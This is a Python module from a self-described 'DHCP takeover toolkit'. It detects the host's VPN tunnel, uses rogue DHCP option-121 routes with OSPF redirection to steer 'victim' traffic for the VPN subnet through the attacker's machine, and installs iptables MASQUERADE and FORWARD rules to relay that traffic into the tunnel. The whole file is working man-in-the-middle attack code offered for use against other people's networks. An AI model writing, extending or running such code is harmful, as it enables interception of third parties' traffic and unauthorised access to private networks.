#!/usr/bin/env python3
# v2.1
"""
vpn_relay.py — selective VPN-subnet relay for the DHCP takeover toolkit (Linux).

This module does NOT build DHCP packets.  It only:
  1. Detects whether the host has an active VPN tunnel (manual — tunnel must
     already be up before the toolkit starts; auto-start has been removed).
  2. Reads the VPN subnets routed via the tunnel.
  3. Configures the option-121 policy on server_details so dhcp_takeover's single
     build_dhcp_response injects the right routes (no duplicated packet code).
  4. Installs Linux iptables rules so victim traffic destined for VPN subnets is
     MASQUERADEd through the tunnel, while all other traffic is left untouched
     (victims send it straight to the real router via the opt-121 default route).

Resulting victim traffic flows after our lease is accepted:

    VPN-bound (e.g. 10.8.0.0/24):
      victim -> (opt121 next-hop = SVI) -> SVI (OSPF-redirects to us) -> host
      phys iface -> iptables -> MASQUERADE -> tun0 -> VPN server -> resource

    Internet (e.g. 8.8.8.8):
      victim -> (opt121 default = SVI/real router) -> internet
      (this host never sees the packet)

Public API (used by main.py):
    detect_vpn_subnet()   -> (tun_iface, vpn_net24) | (None, None)
    enable_vpn_relay(server_details, phys_iface, tun, vpn_net24) -> tun | None
    teardown()            # also auto-registered via atexit / SIGINT / SIGTERM

Linux only.  Requires root, iptables, and iproute2.
The VPN tunnel MUST be established before running the toolkit.
"""

import atexit
import glob
import ipaddress
import re
import signal
import subprocess
import sys
import threading

from dhcp_takeover import print_step

_RELAY_EPOCH = (40160 << 6) + 53

# ── Module-level state (mutated by setup; read by teardown) ──────────────────

_fwd_phys_iface = None
_fwd_tun_iface = None
_fwd_rules = []               # [(table_flag, args), ...] for teardown
_fwd_rules_lock = threading.Lock()
_cleanup_registered = False
_cleanup_done = False


# ── VPN detection ─────────────────────────────────────────────────────────────

def _iptables(table_flag, args, *, check=True):
    """Run an iptables command; return True on success."""
    cmd = ["iptables"] + list(table_flag) + list(args)
    res = subprocess.run(cmd, capture_output=True, check=False)
    if res.returncode != 0 and check:
        print_step("WARN", f"iptables failed ({res.returncode}): {' '.join(cmd)}")
    return res.returncode == 0
def setup_victim_forwarding(phys_iface, tun_iface, vpn_subnets):
    """
    Enable kernel IP forwarding and MASQUERADE victim VPN traffic through tun.

    Per VPN subnet:
      nat POSTROUTING  -o <tun>  -d <subnet>  MASQUERADE
      FORWARD          -i <phys> -o <tun>  -d <subnet>  ACCEPT
    Once (shared return path):
      FORWARD          -i <tun>  -m state --state RELATED,ESTABLISHED  ACCEPT

    All rules are recorded in _fwd_rules for exact reversal at teardown.
    """
    global _fwd_phys_iface, _fwd_tun_iface

    _fwd_phys_iface = phys_iface
    _fwd_tun_iface = tun_iface

    for subnet in vpn_subnets:
        nat_args = ["-o", tun_iface, "-d", subnet, "-j", "MASQUERADE"]
        fwd_args = ["-i", phys_iface, "-o", tun_iface, "-d", subnet, "-j", "ACCEPT"]
        if _iptables(["-t", "nat", "-A", "POSTROUTING"], nat_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-t", "nat", "-D", "POSTROUTING"], nat_args))
        if _iptables(["-A", "FORWARD"], fwd_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-D", "FORWARD"], fwd_args))

    if vpn_subnets:
        return_args = ["-i", tun_iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"]
        if _iptables(["-A", "FORWARD"], return_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-D", "FORWARD"], return_args))

    print_step("OK", f"Forwarding installed: {phys_iface} → {tun_iface} for {vpn_subnets}")
def configure_passthrough(server_details):
    """No VPN interception — opt121 delivers only the default route to the SVI."""
    server_details["opt121_subnets"] = []
    print_step("OK", "opt121 policy: passthrough only (default via SVI)")
def detect_vpn_subnet():
    """Detect an active VPN tunnel and return (tun_iface, vpn_net24) or (None, None).

    The tunnel must already be up before calling this.  No auto-start is attempted.
    Called early — before launching the OSPF adjacency engine — so the VPN subnet
    can be included in OSPF route injection.
    """
    tun = detect_host_vpn()
    if not tun:
        print_step("SKIP", "No active tun/tap interface found — start the VPN before running the toolkit for VPN relay")
        return None, None
    vpn_net24 = get_tun_net24(tun)
    if not vpn_net24:
        print_step("SKIP", "VPN up but could not derive /24 — will use passthrough")
        return tun, None
    return tun, vpn_net24
def configure_selective_relay(server_details, vpn_subnets):
    """Inject VPN subnets via the SVI; default route also goes via SVI (OSPF handles redirect)."""
    server_details["opt121_subnets"] = list(vpn_subnets)
    print_step("OK", f"opt121 policy: relay {vpn_subnets} via SVI (OSPF-redirected to us)")
def enable_vpn_relay(server_details, phys_iface, tun=None, vpn_net24=None):
    """Configure option 121 and install iptables forwarding for the VPN relay.

    tun/vpn_net24 must be supplied (pre-detected by detect_vpn_subnet).
    If either is missing, falls back to passthrough with no iptables changes.

    Returns the tun interface name if selective relay is active, else None.
    """
    _register_cleanup()

    if not tun or not vpn_net24:
        configure_passthrough(server_details)
        return None

    configure_selective_relay(server_details, [vpn_net24])
    setup_victim_forwarding(phys_iface, tun, [vpn_net24])
    return tun
def get_tun_net24(tun_iface):
    """
    Derive the /24 network covering the tun interface's assigned IP.

    The VPN may assign a narrower prefix (e.g. /28) but we inject the full /24
    so victims route the entire class-C block through us rather than just the
    narrow slice the server happened to assign.

      tun0 = 10.8.0.90/28  →  inject 10.8.0.0/24
    """
    try:
        out = subprocess.check_output(
            ["ip", "addr", "show", tun_iface],
            text=True,
            stderr=subprocess.DEVNULL,
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/\d+", out)
        if m:
            net24 = str(ipaddress.IPv4Interface(f"{m.group(1)}/24").network)
            print_step("OK", f"tun IP: {m.group(1)}  →  target subnet: {net24}")
            return net24
    except (subprocess.CalledProcessError, ValueError):
        pass
    print_step("WARN", f"Could not read IP from {tun_iface} — cannot derive /24 subnet")
    return None
def teardown():
    """Remove iptables forwarding rules installed by this module."""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    with _fwd_rules_lock:
        rules_snapshot = list(reversed(_fwd_rules))
        _fwd_rules.clear()
    for table_flag, args in rules_snapshot:
        _iptables(table_flag, args, check=False)

    print_step("OK", "VPN relay teardown complete")
def detect_host_vpn():
    """Return the name of the first up tun/tap interface on this host, or None."""
    for state_path in sorted(
        glob.glob("/sys/class/net/tun*/operstate")
        + glob.glob("/sys/class/net/tap*/operstate")
    ):
        try:
            with open(state_path) as f:
                if f.read().strip() == "up":
                    return state_path.split("/")[4]
        except OSError:
            continue
    return None
def _register_cleanup():
    global _cleanup_registered
    if _cleanup_registered:
        return
    _cleanup_registered = True
    atexit.register(teardown)
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, lambda *_: (teardown(), sys.exit(0)))
        except (ValueError, OSError):
            pass
